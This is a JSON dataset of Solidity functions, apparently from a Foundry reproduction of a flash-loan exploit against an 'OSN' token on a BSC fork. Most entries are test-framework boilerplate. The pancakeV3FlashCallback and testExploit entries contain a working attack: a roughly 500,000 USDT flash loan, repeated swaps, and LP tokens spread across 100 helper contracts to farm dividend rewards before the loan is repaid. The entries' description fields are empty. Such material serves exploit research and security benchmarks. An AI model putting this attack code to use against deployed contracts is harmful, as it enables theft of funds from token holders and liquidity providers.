[
  {
    "contract/interface": "Imoney",
    "source_type": "victim_contract",
    "function_name": "addLiq",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Imoney",
    "source_type": "victim_contract",
    "function_name": "cc",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {\n        OSN.approve(address(router), type(uint256).max - 1);\n        USDT.approve(address(router), type(uint256).max - 1);\n        OSN_PAIR.approve(address(router), type(uint256).max - 1);\n        uint256 usdt_balance = USDT.balanceOf(address(this));\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n        usdt_balance = USDT.balanceOf(address(this));\n        uint256 osn_balance = OSN.balanceOf(address(this)) - 100 * 1_000_000_000_000_000; //use to transfer to contract\n        console.log(usdt_balance, osn_balance);\n        router.addLiquidity(\n            address(USDT), address(OSN), usdt_balance, osn_balance, 0, 0, address(this), block.timestamp\n        );\n        console.log(OSN_PAIR.balanceOf(address(this)));\n        uint256 pair_balance = OSN_PAIR.balanceOf(address(this));\n        uint256 helpContractAmount = 100;\n        uint256 i = 0;\n        // step1 transfer money to the money contract\n        while (i < helpContractAmount) {\n            address money = cal_address(i);\n            USDT.transfer(money, 1_000_000_000_000_000);\n            OSN.transfer(money, 1_000_000_000_000_000);\n            i++;\n        }\n\n        // step2 create contract & add liq\n        create_contract(helpContractAmount);\n\n        // step 3 attack logic\n        i = 0;\n        while (i < helpContractAmount) {\n            address money = cal_address(i);\n            OSN_PAIR.transfer(money, pair_balance);\n            Imoney(money).addLiq(pair_balance);\n            i++;\n        }\n        router.removeLiquidity(\n            address(USDT), address(OSN), OSN_PAIR.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n        i = 0;\n        while (i < 10) {\n            // Activate divided\n            swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);\n            swap_token_to_token(address(OSN), address(USDT), OSN.balanceOf(address(this)));\n            i++;\n        }\n        i = 0;\n        while (i < helpContractAmount) {\n            // collect reward\n            address money = cal_address(i);\n            Imoney(money).cc();\n            i++;\n        }\n\n        USDT.transfer(address(pool), borrow_amount + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 38_474_365);\n        deal(address(USDT), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), 18);\n        // borrow_amount = 500_000 ether;\n        borrow_amount = 500_009_458_043_549_158_462_637;\n        pool.flash(address(this), borrow_amount, 0, \"\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]